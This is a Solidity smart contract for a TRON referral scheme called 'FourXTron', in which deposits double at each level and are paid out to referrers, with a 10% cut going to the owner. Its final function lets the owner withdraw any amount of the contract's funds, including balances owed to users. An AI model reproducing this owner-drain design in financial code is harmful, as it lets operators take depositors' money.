//SourceUnit: contract.sol

pragma solidity ^0.5.10;

contract FourXTron{
  
  
  struct Investor {
    bool registered;
    address referer;
    uint referralCnt;
    uint currentPlan;
    uint balanceRef;
    uint totalRef;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  struct referralLevelCnt {
    
    uint referralCntTierOne;
    uint referralCntTierTwo;
    uint referralCntTierThree;
    uint referralCntTierFour;
    uint referralCntTierFive;
    uint referralCntTierSix;
    uint referralCntTierSeven;
    uint referralCntTierEight;
    uint referralCntTierNine;
    uint referralCntTierTen;
    uint referralCntTierEleven;
  }
  
  struct referralLevelAmt {
    
    uint referralLevelAmtOne;
    uint referralLevelAmtTwo;
    uint referralLevelAmtThree;
    uint referralLevelAmtFour;
    uint referralLevelAmtFive;
    uint referralLevelAmtSix;
    uint referralLevelAmtSeven;
    uint referralLevelAmtEight;
    uint referralLevelAmtNine;
    uint referralLevelAmtTen;
    uint referralLevelAmtEleven;
  }  
  
    
  uint MIN_DEPOSIT = 200 trx;
  uint MAX_DEPOSIT = 204800 trx;
  
  
  address payable public owner = msg.sender;
  
  uint[] public userPlans;
 
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping (address => referralLevelCnt) public referrallevelcnts;
  mapping (address => referralLevelAmt) public referrallevelamts;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Reinvest(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  event TransferOwnership(address user);
  
   constructor() public {
    for(uint i=200; i<=204800;i*=2){
        userPlans.push(i);
    }
  }
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
        investors[msg.sender].registered = true;
        totalInvestors++;
      
        if (investors[referer].registered && referer != msg.sender) {
            investors[msg.sender].referer = referer;
            investors[referer].referralCnt += 1;
        }
    }
  }
  
  
  function rewardReferers(uint amount, address referer) internal {
      
  
    address rec = referer;
    if(investors[rec].registered && rec != msg.sender){
       
        uint profitAmt = amount*90/100;
        investors[rec].balanceRef += profitAmt;
        investors[rec].totalRef += profitAmt;
        totalRefRewards += profitAmt;
        
        uint ownerFee = amount*10/100;
        owner.transfer(ownerFee);
        
        if(investors[msg.sender].currentPlan <= investors[rec].currentPlan){
    
        
            if(amount==200 trx){
                referrallevelcnts[rec].referralCntTierOne++;
                referrallevelamts[rec].referralLevelAmtOne += profitAmt;
            }
            else if(amount==400 trx){
                referrallevelcnts[rec].referralCntTierTwo++;
                referrallevelamts[rec].referralLevelAmtTwo += profitAmt;
            }
            else if(amount==800 trx){
                referrallevelcnts[rec].referralCntTierThree++;
                referrallevelamts[rec].referralLevelAmtThree += profitAmt;
            }
            else if(amount==1600 trx){
                referrallevelcnts[rec].referralCntTierFour++;
                referrallevelamts[rec].referralLevelAmtFour += profitAmt;
            }
            else if(amount==3200 trx){
                referrallevelcnts[rec].referralCntTierFive++;
                referrallevelamts[rec].referralLevelAmtFive += profitAmt;
            }
            else if(amount==6400 trx){
                referrallevelcnts[rec].referralCntTierSix++;
                referrallevelamts[rec].referralLevelAmtSix += profitAmt;
            }
            else if(amount==12800 trx){
                referrallevelcnts[rec].referralCntTierSeven++;
                referrallevelamts[rec].referralLevelAmtSeven += profitAmt;
            }
            else if(amount==25600 trx){
                referrallevelcnts[rec].referralCntTierEight++;
                referrallevelamts[rec].referralLevelAmtEight += profitAmt;
            }
            else if(amount==51200 trx){
                referrallevelcnts[rec].referralCntTierNine++;
                referrallevelamts[rec].referralLevelAmtNine += profitAmt;
            }
            else if(amount==102400 trx){
                referrallevelcnts[rec].referralCntTierTen++;
                referrallevelamts[rec].referralLevelAmtTen += profitAmt;
            }
            else if(amount==204800 trx){
                referrallevelcnts[rec].referralCntTierEleven++;
                referrallevelamts[rec].referralLevelAmtEleven += profitAmt;
            }
        }
    }
  }
  
 
  
    function deposit(address referer) external payable {
   
        require(msg.value <= MAX_DEPOSIT);
    	if(investors[msg.sender].registered){
    	    uint minDeposit = userPlans[investors[msg.sender].currentPlan+1];
	        require(msg.value == minDeposit*1000000);
	        investors[msg.sender].currentPlan ++;
    	}
    	else {
    	     require(msg.value == MIN_DEPOSIT);
        }
	
	    register(referer);

	    rewardReferers(msg.value,investors[msg.sender].referer);
		
		investors[msg.sender].invested += msg.value;
	
		totalInvested += msg.value;
		
	}
    
   function transferOwnership(address payable to) external {
        require(msg.sender == owner);
        owner = to;
        emit TransferOwnership(owner);
    }

    function withdraw() external {
        uint amount =  investors[msg.sender].balanceRef;
        if (msg.sender.send(amount)) {
            investors[msg.sender].withdrawn += amount;
            totalWithdrawal +=amount;
            investors[msg.sender].balanceRef = 0;
            emit Withdraw(msg.sender, amount);
        }
    }  

  

  
    function myData() public view returns (uint,uint,uint,uint,uint,uint) {
     Investor storage investor = investors[msg.sender];
    
	 uint invested = investor.invested;
	 uint balanceRef = investor.balanceRef;
	 uint currentPlan = investor.currentPlan;
	 uint referralCnt = investor.referralCnt;
	 uint totalRef = investor.totalRef;
	 uint withdrawn = investor.withdrawn;
	 return (invested,balanceRef,currentPlan,referralCnt,totalRef,withdrawn);
    
  }
  
   function myReferralCnt() public view returns (uint,uint,uint,uint,uint,uint,uint,uint,uint,uint,uint) {
    
    referralLevelCnt storage referrallevelcnt = referrallevelcnts[msg.sender];


	 return (referrallevelcnt.referralCntTierOne,
	         referrallevelcnt.referralCntTierTwo,
	         referrallevelcnt.referralCntTierThree,
	         referrallevelcnt.referralCntTierFour,
	         referrallevelcnt.referralCntTierFive,
	         referrallevelcnt.referralCntTierSix,
	         referrallevelcnt.referralCntTierSeven,
	         referrallevelcnt.referralCntTierEight,
	         referrallevelcnt.referralCntTierNine,
	         referrallevelcnt.referralCntTierTen,
	         referrallevelcnt.referralCntTierEleven);
    
  }
  
   function myReferralAmt() public view returns (uint,uint,uint,uint,uint,uint,uint,uint,uint,uint,uint) {
    
    referralLevelAmt storage referrallevelamt = referrallevelamts[msg.sender];


	 return (referrallevelamt.referralLevelAmtOne,
	         referrallevelamt.referralLevelAmtTwo,
	         referrallevelamt.referralLevelAmtThree,
	         referrallevelamt.referralLevelAmtFour,
	         referrallevelamt.referralLevelAmtFive,
	         referrallevelamt.referralLevelAmtSix,
	         referrallevelamt.referralLevelAmtSeven,
	         referrallevelamt.referralLevelAmtEight,
	         referrallevelamt.referralLevelAmtNine,
	         referrallevelamt.referralLevelAmtTen,
	         referrallevelamt.referralLevelAmtEleven);
    
  }
  

  function withdrawalToAddress(address payable to,uint amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
  }
}